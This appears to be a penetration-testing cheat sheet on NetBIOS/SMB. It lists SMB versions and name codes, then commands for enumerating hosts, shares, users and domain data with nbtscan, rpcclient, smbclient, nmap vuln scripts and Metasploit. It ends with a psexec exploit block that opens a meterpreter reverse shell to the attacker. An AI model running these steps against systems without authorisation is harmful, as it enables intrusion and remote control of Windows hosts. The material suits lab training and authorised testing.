# NetBios (Windows)
- SMB1: Windows 2000, XP, 2003 
	-  eternal blue
- SMB2: Vista SP1, 2008 
- SMB2.1: 7 and 2008 R2 
- SMB3: 8 and Windows 2012 
##### Unique Name
- assigned to a single host

| Code | Unique Name                        |
| :--- | :--------------------------------- |
| 00   | Workstation Service (hostname)     |
| 03   | Windows Messenger service<br>      |
| 06   | Remote Access Service              |
| 20   | File Service (Host Record)         |
| 21   | Remote Access Service client       |
| 1B   | Domain Master Browser (Primary DC) |
| 1D   | Master Browser                     |
##### Group Name
- Name can be shared across multiple hosts

| Code | Group Name                                  |
| :--- | :------------------------------------------ |
| 00   | Workstation Service (workgroup/domain name) |
| 1C   | Domain Controllers for a domain             |
| 1E   | Browser Service Elections                   |


## Enumeration

##### nbtscan for IP, MAC, and Hostname
- udp 137
```bash
nbtscan -r [IP]
```
```bash
nbtscan -r [IP]/[CIDR]
```

##### nmblookup
```bash
nmblookup -A [IP]
```

#### Enum4linux
```bash
enum4linux -a [IP]
```

##### nmap
```bash
nmap –p 135, 445 –script=smb-vulns,smb-os-discovery [IP]
```
```bash
nmap --script=smb-enum-shares.nse,smb-ls.nse,smb-enum-users.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-security-mode.nse,smbv2-enabled.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms17-010.nse, smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse,smbv2-enabled.nse [IP] -p 135-139,445
```


### RPCclient
- requires authentication

```bash
rpcclient -U "[USER]" [IP]
```

##### Shows server information
```bash
srvinfo
```

##### Enumerate domain users
```bash
enumdomusers
```

##### Get domain password policy information
```bash
getdompwinfo
```

##### Query domain information (e.g., domain SID, name, etc.)
```bash
querydominfo
```

##### List shared resources (basic share listing)
```bash
netshareenum
```

##### List all shared resources (more complete)
```bash
netshareenumall
```

### Null Session (net)
```bash
net use \\[IP]\[SHARE] "" /u:"" 
```
```bash
net view \\[IP]
```

### SMBMAP

##### Enumerate SMB Shares on Target Host
```bash
Smbmap -H [IP] -R --depth [5]
```

### Smbclient

##### Enumerate SMB shares
```bash
smbclient -L //[IP]
```

##### Enumerate SMB shares (Null Session)
```bash
smbclient -L //[IP] -N
```

##### Authenticated Acess 
```bash
smbclient //[IP]/[SHARE] -U [USER]
```

### Metasploit

##### Enumerate RID's
```bash
use auxiliary/scanner/netbios/nbname
set RHOSTS [IP]
run
```

##### Enumerate SID's
```bash
use auxiliary/scanner/smb/smb_lookupsid
set RHOSTS [IP]
set SMBUser [username]
set SMBPass [password]
run
```


## Exploitation

### Metasploit

##### psexec
```bash
use exploit/windows/smb/psexec
set RHOSTS [IP]
set SMBUser [username]
set SMBPass [password]
set LHOST [Your IP]
set LPORT [Your Port]
set PAYLOAD windows/meterpreter/reverse_tcp
run
```